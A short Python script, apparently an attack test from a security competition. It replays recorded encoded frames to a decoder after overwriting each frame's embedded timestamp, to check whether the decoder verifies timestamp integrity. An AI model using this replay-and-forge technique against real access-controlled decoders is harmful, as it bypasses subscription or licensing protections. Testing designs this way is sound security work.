#!/usr/bin/env python3
# modify timestamps of the recording
# if decoder doesn't verify timestamp integrity
import json
import struct

from attack_utils import conn, run_attack


def main():
    with open("../test_out/recording.json") as f:
        recording = json.load(f)
    r = conn()

    listing = r.list()
    channel_1 = next(c for c in listing if c[0] == 1)

    first_timestamp = recording[0]["timestamp"]
    first_frame = bytes.fromhex(recording[0]["encoded"])
    try:
        offset = first_frame.index(struct.pack("<Q", first_timestamp))
    except ValueError:
        print("couldn't find timestamp offset")
        return
    print("found timestamp offset", offset)

    for msg, timestamp in zip(recording, range(channel_1[1], channel_1[2]), strict=False):
        new_frame = bytearray.fromhex(msg["encoded"])
        new_frame[offset : offset + 8] = struct.pack("<Q", timestamp)
        print(r.decode(new_frame))


if __name__ == "__main__":
    run_attack(main, 30)
